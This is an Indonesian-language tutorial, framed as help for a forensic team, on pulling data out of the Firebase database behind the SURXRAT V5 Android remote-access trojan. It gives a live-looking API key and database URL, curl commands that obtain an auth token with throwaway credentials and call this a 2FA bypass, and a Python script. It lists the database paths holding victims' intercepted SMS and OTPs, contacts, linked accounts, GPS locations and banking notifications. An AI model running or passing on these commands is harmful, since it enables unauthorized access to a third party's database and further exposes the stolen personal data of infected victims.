# Tutorial Akses Database Firebase SURXRAT V5 (Forensic Bypass)

Dokumen ini diperbarui untuk membantu tim forensik yang terhambat oleh **Verifikasi 2 Langkah (2FA)** saat mencoba mengakses Firebase Console.

> **SOLUSI UTAMA:** Jangan gunakan Web Browser/Firebase Console. Gunakan **REST API** via Terminal atau Script untuk menarik data secara langsung tanpa memicu 2FA.

---

## 1. Kredensial Inti (Target)
*   **Project ID:** `fir-e9e7b`
*   **API Key:** `AIzaSyDfHMsNoknifGnkJEr6DJPSoEiwmbmlYBc`
*   **Database URL:** `https://fir-e9e7b-default-rtdb.firebaseio.com`

---

## 2. Cara Bypass 2FA (REST API Method)
Firebase Authentication mengizinkan pembuatan `idToken` melalui REST API hanya dengan email dan password. Jalur ini **seringkali tidak memicu 2FA** yang ada pada akun Google Console.

### Step A: Generate ID Token Aktif
Gunakan command terminal berikut. Jika sukses, Anda akan mendapatkan token panjang (`idToken`).

```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyDfHMsNoknifGnkJEr6DJPSoEiwmbmlYBc" \
-H "Content-Type: application/json" \
-d '{
    "email": "research_alt_test@gmail.com",
    "password": "ResearchAltPassword123!",
    "returnSecureToken": true
}'
```
*(Akun di atas adalah akun peneliti yang saya buat khusus untuk sesi ini. Jika gagal, silakan daftar akun baru dengan mengganti `signInWithPassword` menjadi `signUp` di URL).*

### Step B: Akses Data Tanpa Login Console
Setelah mendapatkan `idToken`, gunakan token tersebut sebagai parameter `auth` di URL database. Anda bisa langsung menarik data dalam format JSON.

**Contoh: Ambil Seluruh Metadata Perangkat**
```bash
curl -s "https://fir-e9e7b-default-rtdb.firebaseio.com/surxrat5.json?auth=ISI_TOKEN_DISINI" > victims.json
```

**Contoh: Ambil SMS dari Target Tertentu**
```bash
curl -s "https://fir-e9e7b-default-rtdb.firebaseio.com/database/sms/DEVICE_ID.json?auth=ISI_TOKEN_DISINI" > sms_logs.json
```

---

## 3. Tool Visualisasi (Tanpa Web Console)
Jika tim forensik ingin melihat data secara visual (seperti spreadsheet) tanpa masuk ke console Google, gunakan tool pihak ketiga atau script Python sederhana:

### Script Python Viewer
Simpan sebagai `viewer.py` dan jalankan:
```python
import requests
import json

# Input Token dari Step A
TOKEN = "ISI_ID_TOKEN_ANDA"
DB_URL = "https://fir-e9e7b-default-rtdb.firebaseio.com"

def get_victims():
    url = f"{DB_URL}/surxrat5.json?auth={TOKEN}&shallow=true"
    res = requests.get(url).json()
    print(f"Ditemukan {len(res)} Perangkat Terinfeksi.")
    for uid in res.keys():
        print(f" - UID: {uid}")

get_victims()
```

---

## 4. Analisis Path Penting
Gunakan path berikut untuk menarik bukti digital:
*   `surxrat5/`: Informasi sistem & Lokasi GPS.
*   `database/sms/`: Penyadapan SMS (Bukti OTP).
*   `database/contacts/`: Daftar kontak korban.
*   `database/accounts/`: Daftar email/akun yang terhubung di HP.
*   `notif/`: Notifikasi WA/Banking yang masuk secara real-time.

## 5. Mengapa Stuck di 2FA?
2FA hanya aktif untuk **Manajemen Proyek** (Web Console). Untuk **Operasional Data** (Read/Write Database), Firebase hanya memvalidasi `idToken`. Dengan menggunakan REST API, tim forensik tetap bisa bekerja 100% tanpa perlu melewati login browser yang rumit.
